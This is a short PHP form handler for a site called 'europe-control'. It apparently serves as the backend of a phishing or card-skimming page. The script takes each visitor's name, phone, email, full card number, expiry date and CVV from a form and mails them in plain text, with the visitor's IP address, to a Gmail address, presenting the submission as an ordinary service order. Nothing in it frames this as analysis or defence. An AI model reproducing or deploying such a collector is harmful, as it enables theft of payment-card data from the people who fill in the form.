<?php

function mail_utf8($to, $from, $subject='(No subject)', $message='', $add_header='') {
    $headers = "MIME-Version: 1.0\r\n" . "Content-type: text/plain; charset=UTF-8\r\n" . "From: $from\r\n" . $add_header;
    mail($to, '=?UTF-8?B?'.base64_encode($subject).'?=', $message, $headers);
}

$recepient = 'shelltown@gmail.com';  //*self Email*/
$sitename = "europe-control";

// f-name
// l-name
// email
// phone
// card-num
// card-date
// card-cvv

$f_name = trim($_POST["f-name"]);
$l_name = trim($_POST["l-name"]);
$tel = trim($_POST["phone"]);
$from = trim($_POST["email"]);
$card_num = trim($_POST["card-num"]);
$card_date = trim($_POST["card-date"]);
$card_cvv = trim($_POST["card-cvv"]);
$res = trim($_POST["res"]);
$res2 = trim($_POST["res2"]);
$subject = "New contact";
$ip = $_SERVER["REMOTE_ADDR"];

$message = " I would like to order services from you, $subject \n First Name: $f_name \n Last Name: $l_name \n Tel: $tel \n E-mail: $from \n Card: $card_num \n Card date: $card_date \n Card CVV: $card_cvv \n Selected services: $res2 \n sum: € $res \n (User IP:  $ip)";

$pagetitle = 'have a new contact with the site "'.$sitename.'"';

mail_utf8($recepient, $from, $pagetitle, $message, "Reply-To: $from\r\n");

?>